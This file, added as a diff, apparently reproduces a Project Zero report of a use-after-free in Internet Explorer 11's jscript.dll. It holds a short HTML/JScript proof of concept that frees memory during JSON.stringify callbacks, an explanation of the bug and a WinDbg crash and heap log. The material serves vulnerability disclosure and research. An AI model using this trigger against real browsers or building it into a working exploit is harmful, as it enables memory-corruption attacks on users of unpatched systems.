@@ -1,0 +1,140 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1381
+
+There is a use-after-free in jscript.dll library that can be exploited in IE11.
+
+PoC:
+
+=========================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+<script language="Jscript.Encode">
+
+var o1 = {toJSON:function(){
+  alert('o1');
+  return [o2];
+}}
+
+var o2 = {toJSON:function(){
+  alert('o2');
+  CollectGarbage();
+  return 'x';
+}}
+
+JSON.stringify(o1);
+
+</script>
+
+<!--
+=========================================
+
+Technical details: 
+
+JSONStringifyObject first calls JSONApplyFilters which calls an argument's toString method. However the return value of the toString method won't be on the garbage collector's root object list and thus can be freed during subsequent callbacks.
+
+Debug log:
+
+=========================================
+
+0:028> g
+(df8.e48): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+jscript!JSONStringifyArray+0x38f:
+000007fe`edbf9fb3 66214738        and     word ptr [rdi+38h],ax ds:00000000`04518fc8=????
+
+0:014> r
+rax=000000000000fffb rbx=0000000000000000 rcx=0000000000000005
+rdx=0000000000000005 rsi=00000000129ca100 rdi=0000000004518f90
+rip=000007feedbf9fb3 rsp=00000000129c9f30 rbp=00000000129c9fa9
+ r8=0000000000000000  r9=000000000405d670 r10=0000000000000081
+r11=00000000129c9f00 r12=0000000000000001 r13=0000000000000001
+r14=0000000000000000 r15=00000000129ca1a8
+iopl=0         nv up ei pl nz na pe nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+jscript!JSONStringifyArray+0x38f:
+000007fe`edbf9fb3 66214738        and     word ptr [rdi+38h],ax ds:00000000`04518fc8=????
+
+0:014> k
+ # Child-SP          RetAddr           Call Site
+00 00000000`129c9f30 000007fe`edbfa2cc jscript!JSONStringifyArray+0x38f
+01 00000000`129ca000 000007fe`edbfec94 jscript!JSONStringifyObject+0x2dc
+02 00000000`129ca0b0 000007fe`edb9c2ec jscript!JsJSONStringify+0x3e4
+03 00000000`129ca190 000007fe`edb9a9fe jscript!NatFncObj::Call+0x138
+04 00000000`129ca240 000007fe`edb9b234 jscript!NameTbl::InvokeInternal+0x3f8
+05 00000000`129ca360 000007fe`edb99852 jscript!VAR::InvokeByName+0x81c
+06 00000000`129ca570 000007fe`edb99929 jscript!VAR::InvokeDispName+0x72
+07 00000000`129ca5f0 000007fe`edb924b8 jscript!VAR::InvokeByDispID+0x1229
+08 00000000`129ca640 000007fe`edb98ec2 jscript!CScriptRuntime::Run+0x5a6
+09 00000000`129cb440 000007fe`edb98d2b jscript!ScrFncObj::CallWithFrameOnStack+0x162
+0a 00000000`129cb650 000007fe`edb98b95 jscript!ScrFncObj::Call+0xb7
+0b 00000000`129cb6f0 000007fe`edb9e6c0 jscript!CSession::Execute+0x19e
+0c 00000000`129cb7c0 000007fe`edba70e7 jscript!COleScript::ExecutePendingScripts+0x17a
+0d 00000000`129cb890 000007fe`edba68d6 jscript!COleScript::ParseScriptTextCore+0x267
+0e 00000000`129cb980 000007fe`ee2f5251 jscript!COleScript::ParseScriptText+0x56
+0f 00000000`129cb9e0 000007fe`eea7b320 MSHTML!CActiveScriptHolder::ParseScriptText+0xc1
+10 00000000`129cba60 000007fe`ee2f6256 MSHTML!CScriptCollection::ParseScriptText+0x37f
+11 00000000`129cbb40 000007fe`ee2f5c8e MSHTML!CScriptData::CommitCode+0x3d9
+12 00000000`129cbd10 000007fe`ee2f5a11 MSHTML!CScriptData::Execute+0x283
+13 00000000`129cbdd0 000007fe`eeab46fb MSHTML!CHtmScriptParseCtx::Execute+0x101
+14 00000000`129cbe10 000007fe`ee398a5b MSHTML!CHtmParseBase::Execute+0x235
+15 00000000`129cbeb0 000007fe`ee272e39 MSHTML!CHtmPost::Broadcast+0x90
+16 00000000`129cbef0 000007fe`ee2ccaef MSHTML!CHtmPost::Exec+0x4bb
+17 00000000`129cc100 000007fe`ee2cca40 MSHTML!CHtmPost::Run+0x3f
+18 00000000`129cc130 000007fe`ee2cda12 MSHTML!PostManExecute+0x70
+19 00000000`129cc1b0 000007fe`ee2d0843 MSHTML!PostManResume+0xa1
+1a 00000000`129cc1f0 000007fe`ee2b6fc7 MSHTML!CHtmPost::OnDwnChanCallback+0x43
+1b 00000000`129cc240 000007fe`eeae4f78 MSHTML!CDwnChan::OnMethodCall+0x41
+1c 00000000`129cc270 000007fe`ee1d9d75 MSHTML!GlobalWndOnMethodCall+0x240
+1d 00000000`129cc310 00000000`771f9bbd MSHTML!GlobalWndProc+0x150
+1e 00000000`129cc390 00000000`771f98c2 USER32!UserCallWinProcCheckWow+0x1ad
+1f 00000000`129cc450 000007fe`f2694a87 USER32!DispatchMessageWorker+0x3b5
+20 00000000`129cc4d0 000007fe`f269babb IEFRAME!CTabWindow::_TabWindowThreadProc+0x555
+21 00000000`129cf750 000007fe`fe4c572f IEFRAME!LCIETab_ThreadProc+0x3a3
+22 00000000`129cf880 000007fe`efb2925f iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1f
+23 00000000`129cf8b0 00000000`772f59cd IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f
+24 00000000`129cf900 00000000`7742a561 kernel32!BaseThreadInitThunk+0xd
+25 00000000`129cf930 00000000`00000000 ntdll!RtlUserThreadStart+0x1d
+
+0:014> !heap -p -a 00000000`04518fc8
+    address 0000000004518fc8 found in
+    _DPH_HEAP_ROOT @ 3d31000
+    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+                                    3d49750:          4518000             2000
+    000007feefb88726 verifier!AVrfDebugPageHeapFree+0x00000000000000a2
+    00000000774c4255 ntdll!RtlDebugFreeHeap+0x0000000000000035
+    000000007746797c ntdll! ?? ::FNODOBFM::`string'+0x000000000000e982
+    000007fefd4b10c8 msvcrt!free+0x000000000000001c
+    000007feedb9bad2 jscript!NativeErrorProtoObj<16>::`vector deleting destructor'+0x0000000000000022
+    000007feedb9b938 jscript!NameTbl::SetMasterVariant+0x000000000000a240
+    000007feedbb42cb jscript!GcAlloc::ReclaimGarbage+0x000000000000034d
+    000007feedb919e2 jscript!GcContext::Reclaim+0x00000000000000ae
+    000007feedba1956 jscript!GcContext::CollectCore+0x000000000000018b
+    000007feedba17a5 jscript!GcContext::Collect+0x0000000000000025
+    000007feedbe42f3 jscript!JsCollectGarbage+0x0000000000000023
+    000007feedb9c2ec jscript!NatFncObj::Call+0x0000000000000138
+    000007feedb9c199 jscript!NameTbl::InvokeInternal+0x0000000000000377
+    000007feedb986ea jscript!VAR::InvokeByDispID+0xffffffffffffffea
+    000007feedb924b8 jscript!CScriptRuntime::Run+0x00000000000005a6
+    000007feedb98ec2 jscript!ScrFncObj::CallWithFrameOnStack+0x0000000000000162
+    000007feedb98d2b jscript!ScrFncObj::Call+0x00000000000000b7
+    000007feedbc2084 jscript!NameTbl::InvokeInternal+0x000000000000060f
+    000007feedb986ea jscript!VAR::InvokeByDispID+0xffffffffffffffea
+    000007feedbf8ee3 jscript!GCProtectKeyAndCall+0x000000000000009f
+    000007feedbf97a6 jscript!JSONApplyFilters+0x000000000000014a
+    000007feedbfa08b jscript!JSONStringifyObject+0x000000000000009b
+    000007feedbf9e77 jscript!JSONStringifyArray+0x0000000000000253
+    000007feedbfa2cc jscript!JSONStringifyObject+0x00000000000002dc
+    000007feedbfec94 jscript!JsJSONStringify+0x00000000000003e4
+    000007feedb9c2ec jscript!NatFncObj::Call+0x0000000000000138
+    000007feedb9a9fe jscript!NameTbl::InvokeInternal+0x00000000000003f8
+    000007feedb9b234 jscript!VAR::InvokeByName+0x000000000000081c
+    000007feedb99852 jscript!VAR::InvokeDispName+0x0000000000000072
+    000007feedb99929 jscript!VAR::InvokeByDispID+0x0000000000001229
+    000007feedb924b8 jscript!CScriptRuntime::Run+0x00000000000005a6
+    000007feedb98ec2 jscript!ScrFncObj::CallWithFrameOnStack+0x0000000000000162
+
+=========================================
+-->
